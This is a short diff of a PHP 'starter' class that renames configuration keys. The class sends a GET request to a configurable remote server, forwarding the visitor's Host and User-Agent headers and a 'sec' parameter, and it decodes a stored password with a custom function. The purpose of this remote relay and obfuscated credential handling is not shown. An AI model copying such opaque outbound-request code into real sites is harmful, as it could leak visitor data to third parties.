@@ -54,7 +54,7 @@ class starter
                     $fp = fsockopen($this->args['serv'], 80, $errno, $errstr, 5);
             
                     if ($fp) {
-                        $out = "GET /" . $this->args['path'] . '/starter.php?sec=' . urlencode($_GET['sec']) . " HTTP/1.1\r\n";
+                        $out = "GET /" . $this->args['ur_path'] . '/starter.php?sec=' . urlencode($_GET['sec']) . " HTTP/1.1\r\n";
                         $out .= "Host: " . $_SERVER['HTTP_HOST'] . "\r\n";
                         $out .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
                         $out .= "Connection: Close\r\n\r\n";
@@ -88,7 +88,7 @@ class starter
             return false;
         
         $this->st_id = $this->args['log'];
-        $this->path = $this->args['fpath'].$this->args['path'];
+        $this->path = $this->args['path'];
 
         $this->args['pass'] = sp_decodex($this->args['pass'],$crypt_key);
            
